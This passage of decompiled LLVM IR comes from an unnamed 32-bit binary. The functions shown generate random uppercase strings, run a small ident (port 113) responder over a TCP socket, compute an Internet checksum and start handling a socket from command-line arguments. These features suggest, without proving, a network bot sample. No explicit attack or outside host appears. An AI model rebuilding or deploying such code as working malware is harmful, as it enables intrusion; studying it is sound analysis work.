  %v3_855c = ptrtoint i8* %v2_855c to i32
  %v2_8560 = icmp eq i8* %v2_855c, null
  br i1 %v2_8560, label %dec_label_pc_8568, label %dec_label_pc_8578

dec_label_pc_8568:                                ; preds = %dec_label_pc_8548
  %v0_8568 = call i32 @function_fe50()
  br label %dec_label_pc_85e4

dec_label_pc_8578:                                ; preds = %dec_label_pc_8548
  %v2_857c = load i32, i32* @global_var_1f4f4.35, align 4
  %v7_8580 = icmp eq i32 %v2_857c, 1
  br i1 %v7_8580, label %dec_label_pc_8588, label %dec_label_pc_85a0

dec_label_pc_8588:                                ; preds = %dec_label_pc_8578
  %v2_8594 = call i32 @function_f238(i32 %v3_855c)
  br label %dec_label_pc_85e4

dec_label_pc_85a0:                                ; preds = %dec_label_pc_8578
  %v0_85a0 = call i32 @function_fe50()
  %v2_85b0 = load i32, i32* @global_var_1f4f4.35, align 4
  %v2_85bc = call i32 @function_c864(i32 %v0_85a0, i32 %v2_85b0)
  %v2_85cc = load i8*, i8** @global_var_1f4f0.33, align 4
  %v3_85cc = ptrtoint i8* %v2_85cc to i32
  %v2_85d0 = add i32 %v2_85bc, 1
  %v1_85d4 = add i32 %v2_85d0, %v3_85cc
  %v1_85dc = call i32 @function_f238(i32 %v1_85d4)
  br label %dec_label_pc_85e4

dec_label_pc_85e4:                                ; preds = %dec_label_pc_8588, %dec_label_pc_8568, %dec_label_pc_85a0
  %v3_85e4 = phi i32 [ %v2_8594, %dec_label_pc_8588 ], [ %v0_8568, %dec_label_pc_8568 ], [ %v1_85dc, %dec_label_pc_85a0 ]
  ret i32 %v3_85e4

; uselistorder directives
  uselistorder i32 (i32)* @function_f238, { 1, 0 }
  uselistorder label %dec_label_pc_85e4, { 2, 0, 1 }
}

define i32 @function_85f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_85f8:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_85f8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_85f8, i32* @ip, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8634

dec_label_pc_8610:                                ; preds = %dec_label_pc_865c, %dec_label_pc_8634
  %v3_8610 = phi i32 [ %v3_866c, %dec_label_pc_865c ], [ %v3_8644, %dec_label_pc_8634 ]
  store i32 %v3_8610, i32* @r0, align 4
  %v0_8614 = call i32 @function_ecc0()
  %v3_8620 = load i32, i32* %stack_var_-20, align 4
  %v2_8624 = add i32 %v0_8614, -1
  %v1_8628 = add i32 %v2_8624, %v3_8620
  %v3_8630 = inttoptr i32 %v1_8628 to i8*
  store i8 0, i8* %v3_8630, align 1
  %v3_8634.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8634

dec_label_pc_8634:                                ; preds = %dec_label_pc_85f8, %dec_label_pc_8610
  %v3_8634 = phi i32 [ %arg1, %dec_label_pc_85f8 ], [ %v3_8634.pre, %dec_label_pc_8610 ]
  store i32 %v3_8634, i32* @r0, align 4
  %v0_8638 = call i32 @function_ecc0()
  %v3_8644 = load i32, i32* %stack_var_-20, align 4
  %v2_8648 = add i32 %v0_8638, -1
  %v1_864c = add i32 %v2_8648, %v3_8644
  %v1_8650 = inttoptr i32 %v1_864c to i8*
  %v2_8650 = load i8, i8* %v1_8650, align 1
  %v7_8654 = icmp eq i8 %v2_8650, 13
  br i1 %v7_8654, label %dec_label_pc_8610, label %dec_label_pc_865c

dec_label_pc_865c:                                ; preds = %dec_label_pc_8634
  store i32 %v3_8644, i32* @r0, align 4
  %v0_8660 = call i32 @function_ecc0()
  %v3_866c = load i32, i32* %stack_var_-20, align 4
  %v2_8670 = add i32 %v0_8660, -1
  %v1_8674 = add i32 %v2_8670, %v3_866c
  %v1_8678 = inttoptr i32 %v1_8674 to i8*
  %v2_8678 = load i8, i8* %v1_8678, align 1
  %v7_867c = icmp eq i8 %v2_8678, 10
  br i1 %v7_867c, label %dec_label_pc_8610, label %dec_label_pc_8684

dec_label_pc_8684:                                ; preds = %dec_label_pc_865c
  ret i32 %v0_8660

; uselistorder directives
  uselistorder i32 %v3_866c, { 1, 0 }
  uselistorder i32 %v3_8644, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_8634, { 1, 0 }
}

define i32 @function_8688() local_unnamed_addr {
dec_label_pc_8688:
  %stack_var_-1064 = alloca i32, align 4
  %v3_868c = load i32, i32* @r4, align 4
  %v6_868c = load i32, i32* @fp, align 4
  %v2_8698 = ptrtoint i32* %stack_var_-1064 to i32
  %v0_869c = call i32 @function_fe50()
  %v2_86ac = call i32 @function_c930(i32 %v0_869c, i32 5)
  %v1_86b4 = add i32 %v2_86ac, 4
  %v1_86c0 = add i32 %v2_86ac, 5
  %v1_86c8 = call i32 @function_f908(i32 %v1_86c0)
  store i32 %v1_86c0, i32* @r2, align 4
  %v2_86ec = inttoptr i32 %v1_86c8 to i8*
  %v3_86ec = call i32 @function_ec20(i8* %v2_86ec, i32 0)
  store i32 ptrtoint ([16 x i8]* @global_var_14b74.37 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_14b84.39 to i32), i32* @r1, align 4
  %v3_86f8 = call i32 @function_cd94(i32 ptrtoint ([16 x i8]* @global_var_14b74.37 to i32), i32 ptrtoint (i32* @global_var_14b84.39 to i32))
  %v2_8708 = icmp eq i32 %v3_86f8, 0
  br i1 %v2_8708, label %dec_label_pc_8760.preheader, label %dec_label_pc_8774

dec_label_pc_8760.preheader:                      ; preds = %dec_label_pc_8688
  %v5_876c22 = icmp sgt i32 %v1_86b4, 0
  br i1 %v5_876c22, label %dec_label_pc_871c, label %dec_label_pc_8850

dec_label_pc_871c:                                ; preds = %dec_label_pc_8760.preheader, %dec_label_pc_871c
  %storemerge323 = phi i32 [ %v1_8758, %dec_label_pc_871c ], [ 0, %dec_label_pc_8760.preheader ]
  %v2_8728 = add i32 %storemerge323, %v1_86c8
  store i32 %v2_8728, i32* @r4, align 4
  %v0_872c = call i32 @function_fe50()
  %v2_873c = call i32 @function_c930(i32 %v0_872c, i32 26)
  %fold = add i32 %v2_873c, 65
  %v1_8750 = trunc i32 %fold to i8
  %v2_8750 = load i32, i32* @r4, align 4
  %v3_8750 = inttoptr i32 %v2_8750 to i8*
  store i8 %v1_8750, i8* %v3_8750, align 1
  %v1_8758 = add nuw nsw i32 %storemerge323, 1
  %v5_876c = icmp slt i32 %v1_8758, %v1_86b4
  br i1 %v5_876c, label %dec_label_pc_871c, label %dec_label_pc_8850

dec_label_pc_8774:                                ; preds = %dec_label_pc_8688
  %v0_8774 = call i32 @function_fe50()
  store i32 %v0_8774, i32* @r4, align 4
  %v0_877c = call i32 @function_fe50()
  %v0_8784 = load i32, i32* @r4, align 4
  %v2_8784 = mul i32 %v0_8784, %v0_877c
  %v2_8794 = call i32 @function_c930(i32 %v2_8784, i32 45402)
  %v1_879c = add i32 %v2_8794, 1
  %v5_87e030 = icmp sgt i32 %v1_879c, 0
  br i1 %v5_87e030, label %dec_label_pc_87b0, label %dec_label_pc_87e4

dec_label_pc_87b0:                                ; preds = %dec_label_pc_8774, %dec_label_pc_87b0
  %storemerge231 = phi i32 [ %v1_87cc, %dec_label_pc_87b0 ], [ 0, %dec_label_pc_8774 ]
  %v3_87c4 = call i32 @function_e500(i32 %v2_8698, i32 1024, i32 %v3_86f8)
  %v1_87cc = add nuw nsw i32 %storemerge231, 1
  %v5_87e0 = icmp slt i32 %v1_87cc, %v1_879c
  br i1 %v5_87e0, label %dec_label_pc_87b0, label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87b0, %dec_label_pc_8774
  store i32 1024, i32* @r2, align 4
  %v2_87f8 = bitcast i32* %stack_var_-1064 to i8*
  %v3_87f8 = call i32 @function_ec20(i8* %v2_87f8, i32 0)
  %v3_8810 = call i32 @function_e500(i32 %v2_8698, i32 1024, i32 %v3_86f8)
  %v1_8820 = call i32 @function_85f8(i32 %v2_8698)
  store i32 %v1_86c8, i32* @r0, align 4
  store i32 %v2_8698, i32* @r1, align 4
  store i32 %v1_86b4, i32* @r2, align 4
  %v0_8844 = call i32 @function_ec10()
  %v1_884c = inttoptr i32 %v3_86f8 to i8*
  %v2_884c = call i32 @function_cc14(i8* %v1_884c)
  br label %dec_label_pc_8850

dec_label_pc_8850:                                ; preds = %dec_label_pc_8760.preheader, %dec_label_pc_871c, %dec_label_pc_87e4
  store i32 %v3_868c, i32* @r4, align 4
  store i32 %v6_868c, i32* @fp, align 4
  ret i32 %v1_86c8

; uselistorder directives
  uselistorder i32 %v1_87cc, { 1, 0 }
  uselistorder i32 %v1_879c, { 1, 0 }
  uselistorder i32 %v1_8758, { 1, 0 }
  uselistorder i32 %v1_86c8, { 2, 1, 0, 3 }
  uselistorder i32 %v1_86b4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8850, { 2, 1, 0 }
  uselistorder label %dec_label_pc_87b0, { 1, 0 }
  uselistorder label %dec_label_pc_871c, { 1, 0 }
}

define i32 @function_8868(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8868:
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-1236 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8868 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8868, i32* @ip, align 4
  %v3_886c = load i32, i32* @fp, align 4
  store i32 %v3_886c, i32* %stack_var_-16, align 4
  store i32 34932, i32* %stack_var_-4, align 4
  %v13_886c = ptrtoint i32* %stack_var_-16 to i32
  %v2_8870 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8870, i32* @fp, align 4
  %v3_8888 = call i32 @function_f8dc(i32 2, i32 1, i32 0)
  %v7_8898 = icmp eq i32 %v3_8888, -1
  br i1 %v7_8898, label %dec_label_pc_8c38, label %dec_label_pc_88a0

dec_label_pc_88a0:                                ; preds = %dec_label_pc_8868
  store i32 2, i32* %stack_var_-60, align 4
  %v1_88b4 = call i32 @function_f294(i32 113)
  %sext = mul i32 %v1_88b4, 16777216
  %v1_88b8 = sdiv i32 %sext, 16777216
  %v2_88d0 = ptrtoint i32* %stack_var_-60 to i32
  %v10_88f8 = ashr i32 %sext, 31
  %v11_88f8 = bitcast i32* %stack_var_-60 to %sockaddr*
  %v12_88f8 = call i32 @function_f7c8(i32 %v3_8888, %sockaddr* %v11_88f8, i32 16, i32 %v2_88d0, i32 %v1_88b8, i32 %v10_88f8, i32 0, i32 0, i32 0)
  %v7_8900 = icmp eq i32 %v12_88f8, -1
  br i1 %v7_8900, label %dec_label_pc_8c38, label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_88a0
  %v2_8910 = call i32 @function_f820(i32 %v3_8888, i32 1)
  %v7_8918 = icmp eq i32 %v2_8910, -1
  br i1 %v7_8918, label %dec_label_pc_8c38, label %dec_label_pc_8920

dec_label_pc_8920:                                ; preds = %dec_label_pc_8908
  %v1_8920 = call i32 @function_ca44(i32 %v2_8910)
  %v2_8928 = icmp eq i32 %v1_8920, 0
  br i1 %v2_8928, label %dec_label_pc_8c38, label %dec_label_pc_8930

dec_label_pc_8930:                                ; preds = %dec_label_pc_8920
  store i32 16, i32* %stack_var_-44, align 4
  %v2_8938 = ptrtoint i32* %stack_var_-76 to i32
  %v2_893c = ptrtoint i32* %stack_var_-44 to i32
  %v5_8948 = bitcast i32* %stack_var_-76 to %sockaddr*
  %v6_8948 = call i32 @function_f79c(i32 %v3_8888, %sockaddr* %v5_8948, i32 %v2_893c, i32 %v2_8938, i32 16)
  %v2_8958 = add i32 %v6_8948, 1
  %v3_8958 = icmp eq i32 %v6_8948, -1
  br i1 %v3_8958, label %dec_label_pc_8960, label %dec_label_pc_8968.preheader

dec_label_pc_8960:                                ; preds = %dec_label_pc_8930
  %v1_8964 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_8968.preheader

dec_label_pc_8968.preheader:                      ; preds = %dec_label_pc_8960, %dec_label_pc_8930
  %v2_8970 = ptrtoint i32* %stack_var_-1236 to i32
  %v3_89b0 = udiv i32 %v6_8948, 32
  %v3_89c4 = mul nuw nsw i32 %v3_89b0, 4
  %v2_89cc = add i32 %v3_89c4, %v13_886c
  %v1_89dc = urem i32 %v6_8948, 32
  %v6_89e4 = shl i32 1, %v1_89dc
  %v2_8a34 = ptrtoint i32* %stack_var_-1108 to i32
  %v2_8a80 = add i32 %v2_89cc, -1220
  %v1_8a84 = inttoptr i32 %v2_8a80 to i32*
  br label %dec_label_pc_8984.lr.ph

dec_label_pc_8984.lr.ph:                          ; preds = %dec_label_pc_8a64, %dec_label_pc_8968.preheader
  br label %dec_label_pc_8984

dec_label_pc_8984:                                ; preds = %dec_label_pc_8984.lr.ph, %dec_label_pc_8984
  %storemerge28 = phi i32 [ 0, %dec_label_pc_8984.lr.ph ], [ %v1_8998, %dec_label_pc_8984 ]
  %v5_8990 = mul nuw nsw i32 %storemerge28, 4
  %v6_8990 = add i32 %v5_8990, %v2_8970
  %v7_8990 = inttoptr i32 %v6_8990 to i32*
  store i32 0, i32* %v7_8990, align 4
  %v1_8998 = add nuw nsw i32 %storemerge28, 1
  %tmp38 = icmp ult i32 %v1_8998, 32
  br i1 %tmp38, label %dec_label_pc_8984, label %dec_label_pc_89ac

dec_label_pc_89ac:                                ; preds = %dec_label_pc_8984
  %v2_89d4 = load i32, i32* %v1_8a84, align 4
  %v2_89e8 = or i32 %v2_89d4, %v6_89e4
  store i32 %v2_89e8, i32* %v1_8a84, align 4
  store i32 60, i32* %stack_var_-1108, align 4
  %v5_8a4c = call i32 @function_cb44(i32 %v2_8958, i32 %v2_8970, i32 0, i32 0, i32 %v2_8a34)
  %v1_8a54 = icmp slt i32 %v5_8a4c, 0
  br i1 %v1_8a54, label %dec_label_pc_8a5c, label %dec_label_pc_8a64

dec_label_pc_8a5c:                                ; preds = %dec_label_pc_89ac
  %v1_8a60 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_8a64

dec_label_pc_8a64:                                ; preds = %dec_label_pc_89ac, %dec_label_pc_8a5c
  %v2_8a84 = load i32, i32* %v1_8a84, align 4
  %v6_8a901 = lshr i32 %v2_8a84, %v1_89dc
  %v1_8a98 = urem i32 %v6_8a901, 2
  %v2_8a9c = icmp eq i32 %v1_8a98, 0
  br i1 %v2_8a9c, label %dec_label_pc_8984.lr.ph, label %dec_label_pc_8aa8

dec_label_pc_8aa8:                                ; preds = %dec_label_pc_8a64
  %v2_8ab0 = ptrtoint i32* %stack_var_-1100 to i32
  %v5_8ac4 = call i32 @function_f84c(i32 %v6_8948, i32* nonnull %stack_var_-1100, i32 1024, i32 0)
  %tmp39 = icmp slt i32 %v5_8ac4, 1
  br i1 %tmp39, label %dec_label_pc_8ae8, label %dec_label_pc_8adc

dec_label_pc_8adc:                                ; preds = %dec_label_pc_8aa8
  %v7_8ae4 = icmp slt i32 %v5_8ac4, 20
  br i1 %v7_8ae4, label %dec_label_pc_8af0, label %dec_label_pc_8ae8

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8adc, %dec_label_pc_8aa8
  %v1_8aec = call i32 @function_10500(i32 0)
  br label %dec_label_pc_8af0

dec_label_pc_8af0:                                ; preds = %dec_label_pc_8adc, %dec_label_pc_8ae8
  %v2_8b00 = add i32 %v13_886c, -1084
  %v2_8b04 = add i32 %v2_8b00, %v5_8ac4
  %v3_8b0c = inttoptr i32 %v2_8b04 to i8*
  store i8 0, i8* %v3_8b0c, align 1
  %v1_8b14 = add i32 %v13_886c, -1
  %v2_8b24 = add i32 %v1_8b14, %v5_8ac4
  %v2_8b28 = add i32 %v2_8b24, -1084
  %v1_8b2c = inttoptr i32 %v2_8b28 to i8*
  %v2_8b2c = load i8, i8* %v1_8b2c, align 1
  %v7_8b30 = icmp eq i8 %v2_8b2c, 10
  br i1 %v7_8b30, label %dec_label_pc_8b60, label %dec_label_pc_8b38

dec_label_pc_8b38:                                ; preds = %dec_label_pc_8af0
  %v2_8b54 = load i8, i8* %v1_8b2c, align 1
  %v7_8b58 = icmp eq i8 %v2_8b54, 13
  br i1 %v7_8b58, label %dec_label_pc_8b60, label %dec_label_pc_8b84

dec_label_pc_8b60:                                ; preds = %dec_label_pc_8b38, %dec_label_pc_8af0
  store i8 0, i8* %v1_8b2c, align 1
  br label %dec_label_pc_8b84

dec_label_pc_8b84:                                ; preds = %dec_label_pc_8b38, %dec_label_pc_8b60
  %v1_8b88 = add i32 %v13_886c, -2
  %v2_8b98 = add i32 %v1_8b88, %v5_8ac4
  %v2_8b9c = add i32 %v2_8b98, -1084
  %v1_8ba0 = inttoptr i32 %v2_8b9c to i8*
  %v2_8ba0 = load i8, i8* %v1_8ba0, align 1
  %v7_8ba4 = icmp eq i8 %v2_8ba0, 10
  br i1 %v7_8ba4, label %dec_label_pc_8bd4, label %dec_label_pc_8bac

dec_label_pc_8bac:                                ; preds = %dec_label_pc_8b84
  %v2_8bc8 = load i8, i8* %v1_8ba0, align 1
  %v7_8bcc = icmp eq i8 %v2_8bc8, 13
  br i1 %v7_8bcc, label %dec_label_pc_8bd4, label %dec_label_pc_8bf8

dec_label_pc_8bd4:                                ; preds = %dec_label_pc_8bac, %dec_label_pc_8b84
  store i8 0, i8* %v1_8ba0, align 1
  br label %dec_label_pc_8bf8

dec_label_pc_8bf8:                                ; preds = %dec_label_pc_8bac, %dec_label_pc_8bd4
  store i32 %v2_8ab0, i32* @r2, align 4
  %v3_8c1c = call i32 @function_8374(i32 %v6_8948, i32 ptrtoint ([25 x i8]* @global_var_14b88.43 to i32))
  %v1_8c24 = call i32 @function_ca18(i32 %v6_8948)
  %v1_8c2c = call i32 @function_ca18(i32 %v3_8888)
  %v1_8c34 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_8c38

dec_label_pc_8c38:                                ; preds = %dec_label_pc_8920, %dec_label_pc_8908, %dec_label_pc_88a0, %dec_label_pc_8868, %dec_label_pc_8bf8
  %v9_8c3c = phi i32 [ 0, %dec_label_pc_8920 ], [ %v2_8910, %dec_label_pc_8908 ], [ %v12_88f8, %dec_label_pc_88a0 ], [ %v3_8888, %dec_label_pc_8868 ], [ %v1_8c34, %dec_label_pc_8bf8 ]
  ret i32 %v9_8c3c

; uselistorder directives
  uselistorder i8* %v1_8ba0, { 1, 0, 2 }
  uselistorder i8* %v1_8b2c, { 1, 0, 2 }
  uselistorder i32 %storemerge28, { 1, 0 }
  uselistorder i32* %v1_8a84, { 2, 0, 1 }
  uselistorder i32 %v1_89dc, { 1, 0 }
  uselistorder i32 %v2_8970, { 1, 0 }
  uselistorder i32 %v6_8948, { 2, 3, 4, 1, 0, 6, 5 }
  uselistorder i32 %v2_8910, { 1, 2, 0 }
  uselistorder i32 %v12_88f8, { 1, 0 }
  uselistorder i32 %v3_8888, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v13_886c, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_8c38, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8bf8, { 1, 0 }
  uselistorder label %dec_label_pc_8b84, { 1, 0 }
  uselistorder label %dec_label_pc_8af0, { 1, 0 }
  uselistorder label %dec_label_pc_8a64, { 1, 0 }
  uselistorder label %dec_label_pc_8984, { 1, 0 }
}

define i32 @function_8c48(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8c48:
  %stack_var_-4 = alloca i32, align 4
  store i32 35924, i32* %stack_var_-4, align 4
  %v2_8c50 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8c50, i32* @fp, align 4
  %v2_8c64 = icmp eq i32 %arg2, 0
  br i1 %v2_8c64, label %dec_label_pc_8c6c, label %dec_label_pc_8c78

dec_label_pc_8c6c:                                ; preds = %dec_label_pc_8c48
  br label %dec_label_pc_8cb4

dec_label_pc_8c78:                                ; preds = %dec_label_pc_8c48
  %v7_8c7c = icmp eq i32 %arg2, 1
  br i1 %v7_8c7c, label %dec_label_pc_8c84, label %dec_label_pc_8c90

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c78
  br label %dec_label_pc_8cb4

dec_label_pc_8c90:                                ; preds = %dec_label_pc_8c78
  %v1_8c7c = add i32 %arg2, -1
  %v2_8ca0 = call i32 @function_8c48(i32 %arg1, i32 %v1_8c7c)
  %v2_8cac = mul i32 %v2_8ca0, %arg1
  br label %dec_label_pc_8cb4

dec_label_pc_8cb4:                                ; preds = %dec_label_pc_8c84, %dec_label_pc_8c6c, %dec_label_pc_8c90
  %v3_8cb4 = phi i32 [ %arg1, %dec_label_pc_8c84 ], [ 1, %dec_label_pc_8c6c ], [ %v2_8cac, %dec_label_pc_8c90 ]
  ret i32 %v3_8cb4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8cb4, { 2, 0, 1 }
}

define i32 @function_8cc4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8cc4:
  %stack_var_0 = alloca i32, align 4
  %v1_8cc4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8cc4, i32* @ip, align 4
  %v8_8d4011 = icmp sgt i32 %arg2, 1
  br i1 %v8_8d4011, label %dec_label_pc_8d04, label %dec_label_pc_8d44

dec_label_pc_8d04:                                ; preds = %dec_label_pc_8cc4, %dec_label_pc_8d04
  %v3_8d2c = phi i32 [ %v1_8d30, %dec_label_pc_8d04 ], [ %arg2, %dec_label_pc_8cc4 ]
  %stack_var_-36.013 = phi i8* [ %v5_8d28, %dec_label_pc_8d04 ], [ %arg1, %dec_label_pc_8cc4 ]
  %stack_var_-32.012 = phi i32 [ %v2_8d18, %dec_label_pc_8d04 ], [ 0, %dec_label_pc_8cc4 ]
  %v4_8d04 = ptrtoint i8* %stack_var_-36.013 to i32
  %v2_8d08 = load i8, i8* %stack_var_-36.013, align 1
  %v3_8d08 = zext i8 %v2_8d08 to i32
  %v1_8d0c = add i32 %v4_8d04, 1
  %v2_8d0c = inttoptr i32 %v1_8d0c to i8*
  %v3_8d0c = load i8, i8* %v2_8d0c, align 1
  %v4_8d0c = zext i8 %v3_8d0c to i32
  %v4_8d10 = mul nuw nsw i32 %v4_8d0c, 256
  %v5_8d10 = or i32 %v4_8d10, %v3_8d08
  %v2_8d18 = add i32 %v5_8d10, %stack_var_-32.012
  %v1_8d24 = add i32 %v4_8d04, 2
  %v5_8d28 = inttoptr i32 %v1_8d24 to i8*
  %v1_8d30 = add nsw i32 %v3_8d2c, -2
  %v8_8d40 = icmp sgt i32 %v1_8d30, 1
  br i1 %v8_8d40, label %dec_label_pc_8d04, label %dec_label_pc_8d44

dec_label_pc_8d44:                                ; preds = %dec_label_pc_8d04, %dec_label_pc_8cc4
  %v3_8d44 = phi i32 [ %arg2, %dec_label_pc_8cc4 ], [ %v1_8d30, %dec_label_pc_8d04 ]
  %stack_var_-32.0.lcssa = phi i32 [ 0, %dec_label_pc_8cc4 ], [ %v2_8d18, %dec_label_pc_8d04 ]
  %stack_var_-36.0.lcssa = phi i8* [ %arg1, %dec_label_pc_8cc4 ], [ %v5_8d28, %dec_label_pc_8d04 ]
  %v7_8d48 = icmp eq i32 %v3_8d44, 1
  br i1 %v7_8d48, label %dec_label_pc_8d50, label %dec_label_pc_8d7c

dec_label_pc_8d50:                                ; preds = %dec_label_pc_8d44
  %v2_8d58 = load i8, i8* %stack_var_-36.0.lcssa, align 1
  %v3_8d64 = sext i8 %v2_8d58 to i32
  %v2_8d74 = add i32 %v3_8d64, %stack_var_-32.0.lcssa
  br label %dec_label_pc_8d7c

dec_label_pc_8d7c:                                ; preds = %dec_label_pc_8d44, %dec_label_pc_8d50
  %stack_var_-32.1 = phi i32 [ %v2_8d74, %dec_label_pc_8d50 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8d44 ]
  %v3_8d80 = sdiv i32 %stack_var_-32.1, 65536
  %v3_8d8c = urem i32 %stack_var_-32.1, 65536
  %v2_8d90 = add nsw i32 %v3_8d80, %v3_8d8c
  %v3_8d9c = sdiv i32 %v2_8d90, 65536
  %v2_8da4 = add nsw i32 %v3_8d9c, %v2_8d90
  %v2_8da4.not = or i32 %v2_8da4, -65536
  %v1_8db8 = xor i32 %v2_8da4.not, 65535
  %v3_8dd03 = and i32 %v1_8db8, 65280
  %sext = mul i32 %v1_8db8, 16777216
  %v3_8ddc = sdiv i32 %sext, 16777216
  %v5_8de4 = or i32 %v3_8ddc, %v3_8dd03
  ret i32 %v5_8de4

; uselistorder directives
  uselistorder i32 %v2_8d90, { 1, 0 }
  uselistorder i32 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_8d30, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8d7c, { 1, 0 }
  uselistorder label %dec_label_pc_8d04, { 1, 0 }
}

define i32 @function_8df4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8df4:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-5200 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-1104 = alloca i32, align 4
  %stack_var_-5216 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_8df8 = load i32, i32* @r4, align 4
  store i32 %v3_8df8, i32* %stack_var_-20, align 4
  store i32 36352, i32* %stack_var_-4, align 4
  %v16_8df8 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8dfc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8dfc, i32* @fp, align 4
  %v3_8e14 = add i32 %v16_8df8, -5184
  %v4_8e14 = inttoptr i32 %v3_8e14 to i32*
  store i32 %arg1, i32* %v4_8e14, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %arg4, i32* %stack_var_-5216, align 4
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v1_8e58 = call i32 @function_83d8(i32 %arg2)
  %v2_8e60 = icmp eq i32 %v1_8e58, 0
  br i1 %v2_8e60, label %dec_label_pc_8e68, label %dec_label_pc_9530

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8df4
  %v8_8e7c = icmp sgt i32 %arg3, 1
  br i1 %v8_8e7c, label %dec_label_pc_8eb0, label %dec_label_pc_8e80

dec_label_pc_8e80:                                ; preds = %dec_label_pc_8e68
  %v4_8e94 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_14ba4.45 to i32), i32* %r1.global-to-local, align 4
  store i32 %v16_8df8, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_8ea4 = call i32 @function_8374(i32 %v4_8e94, i32 ptrtoint ([33 x i8]* @global_var_14ba4.45 to i32))
  %v1_8eac = call i32 @function_10500(i32 0)
  br label %dec_label_pc_8eb0

dec_label_pc_8eb0:                                ; preds = %dec_label_pc_8e68, %dec_label_pc_8e80
  store i32 1, i32* %r1.global-to-local, align 4
  %v3_8ebc = call i32 @function_f8dc(i32 2, i32 1, i32 0)
  %v3_8ecc = icmp eq i32 %v3_8ebc, -1
  br i1 %v3_8ecc, label %dec_label_pc_8ed4, label %dec_label_pc_8f04

dec_label_pc_8ed4:                                ; preds = %dec_label_pc_8eb0
  store i32 %v16_8df8, i32* %r1.global-to-local, align 4
  %v4_8ee8 = load i32, i32* %v4_8e14, align 4
  store i32 ptrtoint ([37 x i8]* @global_var_14bc8.47 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_8ef8 = call i32 @function_8374(i32 %v4_8ee8, i32 ptrtoint ([37 x i8]* @global_var_14bc8.47 to i32))
  %v1_8f00 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_8f04

dec_label_pc_8f04:                                ; preds = %dec_label_pc_8eb0, %dec_label_pc_8ed4
  %v4_8f10 = load i32, i32* %stack_var_-5216, align 4
  %v1_8f14 = add i32 %v4_8f10, 4
  %v1_8f18 = inttoptr i32 %v1_8f14 to i32*
  %v2_8f18 = load i32, i32* %v1_8f18, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_14bf0.49 to i32), i32* @r1, align 4
  %v4_8f28 = inttoptr i32 %v2_8f18 to i8*
  %v5_8f28 = call i32 @function_ed3c(i8* %v4_8f28, i32 ptrtoint ([8 x i8]* @global_var_14bf0.49 to i32), i32 7)
  %v2_8f30 = icmp eq i32 %v5_8f28, 0
  br i1 %v2_8f30, label %dec_label_pc_8f38, label %dec_label_pc_8f6c

dec_label_pc_8f38:                                ; preds = %dec_label_pc_8f04
  store i32 %v16_8df8, i32* @lr, align 4
  %v4_8f44 = load i32, i32* %stack_var_-5216, align 4
  %v1_8f48 = add i32 %v4_8f44, 4
  %v1_8f4c = inttoptr i32 %v1_8f48 to i32*
  %v2_8f4c = load i32, i32* %v1_8f4c, align 4
  %v1_8f50 = add i32 %v2_8f4c, 7
